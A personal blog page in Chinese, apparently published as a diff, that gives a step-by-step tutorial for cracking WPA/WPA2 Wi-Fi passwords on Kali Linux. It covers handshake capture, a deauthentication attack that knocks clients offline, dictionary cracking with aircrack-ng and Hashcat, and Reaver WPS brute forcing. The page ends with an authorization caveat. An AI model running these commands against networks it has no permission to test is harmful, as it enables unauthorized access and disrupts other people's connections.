@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="night">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="dark light">
+  <meta name="theme-color" content="#0b0d14">
+  <meta name="description" content="suhan 的个人博客，收录技术笔记、随笔和交互作品。">
+  <title>Linux 破解 WiFi - Suhan</title>
+
+  <script type="application/json" id="theme-config">[{"id":"night","label":"夜航深色","color":"#0b0d14","scheme":"dark","default":true},{"id":"paper","label":"纸墨浅色","color":"#f7f4ee","scheme":"light","default":true},{"id":"nocturne","label":"Nocturne 深色","color":"#211d25","scheme":"dark"},{"id":"nocturne-bright","label":"Nocturne Bright","color":"#fbf8ff","scheme":"light"}]</script>
+  <script>
+    // 在首帧前恢复主题，避免刷新时闪白或闪黑；没有保存值时跟随系统偏好。
+    (() => {
+      let stored = null;
+      try {
+        stored = localStorage.getItem("site-theme");
+      } catch (error) {
+        stored = null;
+      }
+      const themeConfigElement = document.getElementById("theme-config");
+      const themeConfig = themeConfigElement ? JSON.parse(themeConfigElement.textContent) : [];
+      const systemScheme = window.matchMedia("(prefers-color-scheme: light)").matches ? "light" : "dark";
+      const defaultTheme = themeConfig.find(item => item.scheme === systemScheme && item.default)?.id || themeConfig[0]?.id || "night";
+      const theme = themeConfig.some(item => item.id === stored) ? stored : defaultTheme;
+      document.documentElement.dataset.theme = theme;
+      const themeColor = document.querySelector('meta[name="theme-color"]');
+      if (themeColor) themeColor.content = themeConfig.find(item => item.id === theme)?.color || "#0b0d14";
+    })();
+  </script>
+
+  <link href="/assets/images/suhan.png" rel="icon">
+  <link href="/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="/assets/css/themes.css?v=1eb77a0cb0" rel="stylesheet">
+  <link href="/assets/css/main.css?v=1eb77a0cb0" rel="stylesheet">
+  <link href="/assets/css/markdown.css?v=1eb77a0cb0" rel="stylesheet">
+  <link href="/assets/vendor/katex/katex.min.css" rel="stylesheet">
+</head>
+<body>
+  <a class="visually-hidden" href="#main">跳到主要内容</a>
+
+<header class="site-header">
+  <div class="header-inner">
+    <a href="/" class="brand" aria-label="Suhan 首页">
+      <img src="/assets/images/suhan.png" alt="" class="brand-mark" width="28" height="28" aria-hidden="true">
+      <span class="brand-name">Suhan</span>
+    </a>
+
+    <nav class="desktop-nav" aria-label="主导航">
+      <ul class="nav-links">
+        <li><a href="/" class="nav-link">Home</a></li>
+        <li><a href="/categories/essay/" class="nav-link">Essay</a></li>
+        <li><a href="/categories/it/" class="nav-link is-active" aria-current="page">IT</a></li>
+        <li><a href="/categories/acgn/" class="nav-link">ACGN</a></li>
+        <li><a href="/about/" class="nav-link">About</a></li>
+      </ul>
+    </nav>
+
+    <div class="header-actions">
+      <a href="https://github.com/suhan42" class="icon-link" target="_blank" rel="noopener" aria-label="GitHub">
+        <span class="bi bi-github" aria-hidden="true"></span>
+      </a>
+
+      <details class="theme-picker" data-theme-picker>
+        <summary class="theme-toggle" data-theme-toggle aria-label="选择主题" title="选择主题">
+          <span class="icon-sun bi bi-brightness-high" aria-hidden="true"></span>
+          <span class="icon-moon bi bi-moon-stars" aria-hidden="true"></span>
+        </summary>
+        <div class="theme-menu" role="group" aria-label="主题选择">
+          <button type="button" class="theme-option" data-theme-option="night" aria-pressed="false"><span class="theme-swatch" style="--swatch: #0b0d14" aria-hidden="true"></span>夜航深色</button>
+          <button type="button" class="theme-option" data-theme-option="paper" aria-pressed="false"><span class="theme-swatch" style="--swatch: #f7f4ee" aria-hidden="true"></span>纸墨浅色</button>
+          <button type="button" class="theme-option" data-theme-option="nocturne" aria-pressed="false"><span class="theme-swatch" style="--swatch: #211d25" aria-hidden="true"></span>Nocturne 深色</button>
+          <button type="button" class="theme-option" data-theme-option="nocturne-bright" aria-pressed="false"><span class="theme-swatch" style="--swatch: #fbf8ff" aria-hidden="true"></span>Nocturne Bright</button>
+        </div>
+      </details>
+
+      <details class="mobile-nav">
+        <summary class="icon-link" aria-label="打开导航菜单">
+          <span class="bi bi-list" aria-hidden="true"></span>
+        </summary>
+        <nav class="mobile-menu" aria-label="移动导航">
+          <a href="/">Home</a>
+          <a href="/categories/essay/">Essay</a>
+          <a href="/categories/it/" class="is-active" aria-current="page">IT</a>
+          <a href="/categories/acgn/">ACGN</a>
+          <a href="/about/">About</a>
+          <a href="/archive/">Archive</a>
+        </nav>
+      </details>
+    </div>
+  </div>
+</header>
+
+  <main id="main" class="layout post-layout-shell" tabindex="-1">
+<div class="post-layout">
+  <details class="post-toc" open>
+    <summary aria-label="收起文章目录">
+      <span>目录</span>
+      <span class="bi bi-chevron-double-left toc-toggle-glyph" aria-hidden="true"></span>
+    </summary>
+    <nav aria-label="文章目录">
+      <ol class="toc-list">
+<li class="toc-item toc-level-1"><a href="#post-title">Linux 破解 WiFi</a></li>
+<li class="toc-item toc-level-2"><a href="#%E4%B8%80%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">一、准备工作</a></li>
+<li class="toc-item toc-level-2"><a href="#%E4%BA%8C%E5%B7%A5%E5%85%B7%E6%A6%82%E8%BF%B0">二、工具概述</a></li>
+<li class="toc-item toc-level-2"><a href="#%E4%B8%89%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4">三、详细步骤</a></li>
+<li class="toc-item toc-level-4"><a href="#%E4%B8%8B%E8%BD%BD%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1">下载无线网卡</a></li>
+<li class="toc-item toc-level-4"><a href="#1-%E5%B0%86%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%88%87%E6%8D%A2%E4%B8%BA%E7%9B%91%E6%8E%A7%E6%A8%A1%E5%BC%8F">1. 将无线网卡切换为监控模式</a></li>
+<li class="toc-item toc-level-4"><a href="#2-%E6%89%AB%E6%8F%8F%E5%91%A8%E5%9B%B4%E7%9A%84-wi-fi-%E7%BD%91%E7%BB%9C">2. 扫描周围的 Wi-Fi 网络</a></li>
+<li class="toc-item toc-level-4"><a href="#3-%E9%80%89%E6%8B%A9%E7%9B%AE%E6%A0%87-wi-fi-%E7%BD%91%E7%BB%9C%E5%B9%B6%E6%8D%95%E8%8E%B7%E6%8F%A1%E6%89%8B%E5%8C%85">3. 选择目标 Wi-Fi 网络并捕获握手包</a></li>
+<li class="toc-item toc-level-4"><a href="#4-%E5%BC%BA%E5%88%B6%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%87%8D%E6%96%B0%E8%BF%9E%E6%8E%A5deauthentication-%E6%94%BB%E5%87%BB">4. 强制客户端重新连接（Deauthentication 攻击）</a></li>
+<li class="toc-item toc-level-4"><a href="#5-%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E6%8D%95%E8%8E%B7%E6%8F%A1%E6%89%8B%E5%8C%85">5. 检查是否成功捕获握手包</a></li>
+<li class="toc-item toc-level-4"><a href="#6-%E4%BD%BF%E7%94%A8%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3-wi-fi-%E5%AF%86%E7%A0%81">6. 使用字典文件破解 Wi-Fi 密码</a></li>
+<li class="toc-item toc-level-4"><a href="#7-%E7%A0%B4%E8%A7%A3%E6%88%90%E5%8A%9F">7. 破解成功</a></li>
+<li class="toc-item toc-level-2"><a href="#iw-%E7%9B%91%E6%8E%A7">iw 监控</a></li>
+<li class="toc-item toc-level-2"><a href="#%E8%AE%BE%E7%BD%AE%E7%9B%91%E6%8E%A7%E6%A8%A1%E5%BC%8F">设置监控模式</a></li>
+<li class="toc-item toc-level-3"><a href="#%E5%9B%9B%E8%BF%9B%E9%98%B6%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E5%B7%A7">四、进阶工具和技巧</a></li>
+<li class="toc-item toc-level-3"><a href="#%E4%BA%94%E9%87%8D%E8%A6%81%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">五、重要的注意事项</a></li>
+</ol>
+    </nav>
+  </details>
+
+  <article class="post-page">
+    <div class="post-meta">
+      <a href="/categories/it/linux/" class="post-category">
+        it / Linux      </a>
+      <time datetime="2026-11-18">2026-11-18</time>
+      <span aria-hidden="true">/</span>
+      <a href="/tags/linux/">#linux</a>
+      <a href="/tags/security/">#security</a>
+    </div>
+
+    <h1 id="post-title" class="post-title">Linux 破解 WiFi</h1>
+
+    <div class="post-body">
+<h2 id="一准备工作">一、准备工作</h2>
+<ol>
+<li>
+<p><strong>安装 Kali Linux</strong>：</p>
+<ul>
+<li>下载最新的 <a href="https://link.zhihu.com/?target=https%3A//www.kali.org/get-kali/">Kali Linux</a> ISO 镜像文件，并将其安装在虚拟机或物理机上。</li>
+<li>安装时，选择完整安装，确保网络安全工具包括 <code>aircrack-ng</code> 套件。</li>
+</ul>
+</li>
+<li>
+<p><strong>硬件要求</strong>：</p>
+<ul>
+<li><strong>无线网卡</strong>：必须支持<strong>监控模式</strong>和<strong>包注入</strong>，推荐使用像 Alfa AWUS036NH 之类的高性能网卡。</li>
+</ul>
+</li>
+<li>
+<p><strong>更新 Kali Linux</strong>：</p>
+<ul>
+<li>确保系统和工具是最新的：</li>
+</ul>
+<p>【注意！！！！】这个是把整个kali都更新了</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> apt</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> update</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> &#x26;&#x26; </span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> apt</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> upgrade</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> -y</span></span></code></pre>
+</li>
+</ol>
+<h2 id="二工具概述">二、工具概述</h2>
+<ul>
+<li><strong>Aircrack-ng</strong>：这是一个用于网络监控、捕获数据包、密钥破解的 Wi-Fi 破解工具集。</li>
+<li><strong><a href="https://zhida.zhihu.com/search?content_id=248952098&amp;content_type=Article&amp;match_order=1&amp;q=Airmon-ng&amp;zhida_source=entity">Airmon-ng</a></strong>：将无线网卡置于监控模式。</li>
+<li><strong><a href="https://zhida.zhihu.com/search?content_id=248952098&amp;content_type=Article&amp;match_order=1&amp;q=Airodump-ng&amp;zhida_source=entity">Airodump-ng</a></strong>：用于捕获 Wi-Fi 网络的数据包。</li>
+<li><strong><a href="https://zhida.zhihu.com/search?content_id=248952098&amp;content_type=Article&amp;match_order=1&amp;q=Aireplay-ng&amp;zhida_source=entity">Aireplay-ng</a></strong>：注入网络包进行干扰或欺骗攻击，常用于解除客户端的连接（deauth）。</li>
+<li><strong>Aircrack-ng</strong>：通过字典破解捕获到的握手包，获取 Wi-Fi 密码。</li>
+</ul>
+<hr>
+<h2 id="三详细步骤">三、详细步骤</h2>
+<h4 id="下载无线网卡">下载无线网卡</h4>
+<h4 id="1-将无线网卡切换为监控模式">1. 将无线网卡切换为监控模式</h4>
+<p>Kali Linux 默认网卡工作在管理模式下（不捕获流量）。使用 <code>airmon-ng</code> 启动监控模式：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airmon-ng</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> start</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span></span></code></pre>
+<ul>
+<li>
+<p><code>wlan0</code> 是你的无线网卡接口名称，可以通过 <code>ifconfig</code> 查看。</p>
+</li>
+<li>
+<p>如果看到错误提示与<strong>进程冲突</strong>，可使用以下命令杀死冲突进程：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airmon-ng</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> check</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> kill</span></span>
+<span class="line"><span class="line-number">2</span></span>
+<span class="line"><span class="line-number">3</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 启动 NetworkManager</span></span>
+<span class="line"><span class="line-number">4</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> systemctl</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> start</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> NetworkManager</span></span>
+<span class="line"><span class="line-number">5</span></span>
+<span class="line"><span class="line-number">6</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 之后重新</span></span>
+<span class="line"><span class="line-number">7</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airmon-ng</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> start</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span></span></code></pre>
+</li>
+</ul>
+<blockquote>
+<p><code>airmon-ng check kill</code> 的作用</p>
+<p>它会杀死以下进程：</p>
+<p><code>NetworkManager</code>  管理网络连接（WiFi/有线）</p>
+<p><code>wpa_supplicant</code>  WiFi 认证连接</p>
+<p><code>dhclient</code>  DHCP 获取 IP</p>
+<p>这些进程被 <code>airmon-ng check kill</code> 杀掉后，需要手动启动才能恢复 WiFi 连接功能。</p>
+</blockquote>
+<p>检查：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 检查 NetworkManager 状态</span></span>
+<span class="line"><span class="line-number">2</span><span style="color:#6F42C1;--shiki-dark:#B392F0">systemctl</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> status</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> NetworkManager</span></span>
+<span class="line"><span class="line-number">3</span></span>
+<span class="line"><span class="line-number">4</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 检查 wpa_supplicant 是否在运行</span></span>
+<span class="line"><span class="line-number">5</span><span style="color:#6F42C1;--shiki-dark:#B392F0">ps</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> aux</span><span style="color:#D73A49;--shiki-dark:#F97583"> |</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> grep</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wpa_supplicant</span></span>
+<span class="line"><span class="line-number">6</span></span>
+<span class="line"><span class="line-number">7</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 检查 dhclient 是否在运行</span></span>
+<span class="line"><span class="line-number">8</span><span style="color:#6F42C1;--shiki-dark:#B392F0">ps</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> aux</span><span style="color:#D73A49;--shiki-dark:#F97583"> |</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> grep</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> dhclient</span></span></code></pre>
+<h4 id="2-扫描周围的-wi-fi-网络">2. 扫描周围的 Wi-Fi 网络</h4>
+<p>使用 <code>airodump-ng</code> 来扫描周围的 Wi-Fi 网络：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airodump-ng</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span></span></code></pre>
+<p>此命令会显示：</p>
+<ul>
+<li>BSSID：路由器的 MAC 地址。</li>
+<li>PWR：信号强度。</li>
+<li>CH：信道（Channel）。</li>
+<li>ENC：加密类型（如 WPA、WPA2）。</li>
+<li>ESSID：Wi-Fi 网络名称。</li>
+</ul>
+<p><img src="https://pica.zhimg.com/v2-33e9e02052addf660ce687dbfa58de14_1440w.jpg" alt="截图_2024-09-27_13-32-23"></p>
+<p>找到目标之后，<strong>按 Ctrl+C 停止扫描</strong>。</p>
+<h4 id="3-选择目标-wi-fi-网络并捕获握手包">3. 选择目标 Wi-Fi 网络并捕获握手包</h4>
+<p>找到目标 Wi-Fi 网络后，记下其 BSSID 和信道，然后<strong>新开一个终端窗口</strong>执行（不要关闭扫描窗口）。</p>
+<p>建议新建文件夹，方便管理生成的文件。</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">mkdir</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> -p</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> ~/wifi_capture</span></span>
+<span class="line"><span class="line-number">2</span></span>
+<span class="line"><span class="line-number">3</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 注意看文件保存的位置</span></span>
+<span class="line"><span class="line-number">4</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airodump-ng</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> --bssid</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> B4:7C:A6:7D:7E:02</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> --channel</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> -w</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> ~/wifi_capture/capture</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span></span></code></pre>
+<p>【常规教程】运行以下命令开始捕获握手包：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airodump-ng</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> --bssid</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> [目标BSSID] --channel [信道] -w [保存文件名] wlan0</span></span>
+<span class="line"><span class="line-number">2</span></span>
+<span class="line"><span class="line-number">3</span><span style="color:#6A737D;--shiki-dark:#6A737D"># 例如：</span></span>
+<span class="line"><span class="line-number">4</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> airodump-ng</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> --bssid</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> B4:7C:A6:7D:7E:02</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> --channel</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> -w</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> ~/capture</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span></span></code></pre>
+<ul>
+<li><code>--bssid</code> 后跟目标 Wi-Fi 的 BSSID。</li>
+<li><code>--channel</code> 后跟信道号。</li>
+<li><code>-w</code> 表示保存握手包的文件名。</li>
+</ul>
+<p><img src="https://pic1.zhimg.com/v2-f5e72975b6c0d9f2a29968b3b226320a_1440w.jpg" alt="截图_2024-09-27_14-04-58"></p>
+<p>【注意，窗口不要关】这个命令会捕获目标 Wi-Fi 网络上的数据包，<strong>直到</strong>捕获到握手包。</p>
+<h4 id="4-强制客户端重新连接deauthentication-攻击">4. 强制客户端重新连接（Deauthentication 攻击）</h4>
+<p>不要关闭捕获握手包，重新开一个窗口进行攻击</p>
+<p>如果在捕获过程中没有用户连接到 Wi-Fi 或没有获取到握手包，可以使用 <code>aireplay-ng</code> 发送断开（deauth）请求，强制客户端重新连接，以便捕获握手包：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span>sudo aireplay-ng --deauth 10 -a [路由器mac地址] -c [客户端mac地址] wlan0mon</span></span></code></pre>
+<ul>
+<li><code>--deauth 10</code> 意思是发送 10 个 deauth 包，10 是可调的数字，代表包的数量。</li>
+<li><code>-a</code> 路由器 mac 地址 。</li>
+<li><code>-c</code> 客户端 mac 地址。</li>
+</ul>
+<p>例子：</p>
+<h4 id="5-检查是否成功捕获握手包">5. 检查是否成功捕获握手包</h4>
+<p>当客户端重新连接时，<code>airodump-ng</code> 窗口的右上角会提示 <code>WPA handshake: [目标BSSID]</code>，表示已成功捕获握手包。握手包会保存在你指定的 <code>.cap</code> 文件中。</p>
+<p><img src="https://pic2.zhimg.com/v2-9270d207cb932066f5df37411460e437_1440w.jpg" alt="捕获握手包成功"></p>
+<h4 id="6-使用字典文件破解-wi-fi-密码">6. 使用字典文件破解 Wi-Fi 密码</h4>
+<p>握手包捕获完成后，接下来使用 <code>aircrack-ng</code> 工具来破解 Wi-Fi 密码。你需要一个包含常见密码的字典文件。网络上有很多常用的字典文件，推荐使用 <code>rockyou.txt</code>，它通常位于 <code>/usr/share/wordlists/</code> 中：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span>sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [目标BSSID] [捕获文件名].cap</span></span></code></pre>
+<ul>
+<li><code>-w</code> 后跟字典文件的路径。</li>
+<li><code>-b</code> 后跟目标 Wi-Fi 的 BSSID。</li>
+<li><code>捕获文件名.cap</code> 是你之前保存的握手包文件。</li>
+</ul>
+<p>破解过程可能需要一些时间，具体取决于密码的复杂性和字典文件的大小。</p>
+<h4 id="7-破解成功">7. 破解成功</h4>
+<p>如果目标 Wi-Fi 的密码在字典文件中，<code>aircrack-ng</code> 将输出 Wi-Fi 密码。你可以使用该密码连接到 Wi-Fi 网络。</p>
+<p><img src="https://pic2.zhimg.com/v2-c7f4cd3f2503602cca96ea53a6ae256d_1440w.jpg" alt="截图_2024-09-27_15-03-39"></p>
+<h2 id="iw-监控">iw 监控</h2>
+<h2 id="设置监控模式">设置监控模式</h2>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> ip</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> link</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> set</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> down</span></span>
+<span class="line"><span class="line-number">2</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> iw</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> dev</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> set</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> type</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> monitor</span></span>
+<span class="line"><span class="line-number">3</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> ip</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> link</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> set</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> up</span></span>
+<span class="line"><span class="line-number">4</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sudo</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> iw</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> dev</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> wlan0</span><span style="color:#032F62;--shiki-dark:#9ECBFF"> info</span></span></code></pre>
+<hr>
+<h3 id="四进阶工具和技巧">四、进阶工具和技巧</h3>
+<ol>
+<li>
+<p><strong><a href="https://zhida.zhihu.com/search?content_id=248952098&amp;content_type=Article&amp;match_order=1&amp;q=Hashcat&amp;zhida_source=entity">Hashcat</a></strong>：
+Hashcat 是一个更强大的密码破解工具，它支持 GPU 加速，可以大幅加快破解速度。使用 Hashcat 破解 WPA2 密码需要将 <code>.cap</code> 文件转换为 Hashcat 支持的格式：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span>hcxpcapngtool -o hashcat.hccapx [捕获文件名].cap</span></span></code></pre>
+<p>然后使用 Hashcat 进行破解：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span>hashcat -m 2500 hashcat.hccapx /path/to/wordlist.txt</span></span></code></pre>
+</li>
+<li>
+<p><strong>Reaver（针对 WPS 漏洞）</strong> ：
+如果目标 Wi-Fi 网络启用了 WPS 功能，你可以使用 <code>Reaver</code> 工具来尝试暴力破解 WPS PIN，从而绕过 WPA/WPA2 加密：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span>sudo reaver -i wlan0mon -b [目标BSSID] -vv</span></span></code></pre>
+<p>这个方法对于没有禁用 WPS 的路由器特别有效。</p>
+</li>
+<li>
+<p><strong>字典生成器</strong>：
+如果默认字典文件不足以破解密码，可以使用 <code>Crunch</code> 工具来生成符合特定模式的字典文件：</p>
+<pre class="shiki shiki-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8" tabindex="0"><code><span class="line"><span class="line-number">1</span><span>crunch 8 10 abcdefghijklmnopqrstuvwxyz -o custom_wordlist.txt</span></span></code></pre>
+<p>该命令生成一个由 8 到 10 位的小写字母组成的字典文件。</p>
+</li>
+</ol>
+<h3 id="五重要的注意事项">五、重要的注意事项</h3>
+<ol>
+<li><strong>合法性</strong>：
+你必须对目标网络拥有明确的授权。未经授权的 Wi-Fi 渗透测试是非法的，可能导致严重的法律后果。</li>
+<li><strong>加密方式</strong>：
+使用 WPA3 加密的网络非常难以破解，目前没有有效的公开方法来破解 WPA3。</li>
+<li><strong>复杂性</strong>：
+破解时间取决于密码的复杂性和字典的质量。较强的密码可能需要很长时间甚至无法破解。</li>
+</ol>
+    </div>
+  </article>
+</div>
+  </main>
+
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <p class="footer-note">
+        suhan 的个人博客。写技术笔记和随笔，也维护几个手作交互页；本站由 Eleventy 构建为纯静态页面。
+      </p>
+      <p class="footer-note">&copy; 2026 suhan42</p>
+    </div>
+
+    <nav class="footer-links" aria-label="页脚链接">
+      <a href="/archive/">Archive</a>
+      <a href="/feed.xml">RSS</a>
+      <a href="https://github.com/suhan42" target="_blank" rel="noopener">GitHub</a>
+    </nav>
+  </div>
+</footer>
+
+  <script src="/assets/js/theme.js"></script>
+  <script src="/assets/js/site.js"></script>
+</body>
+</html>
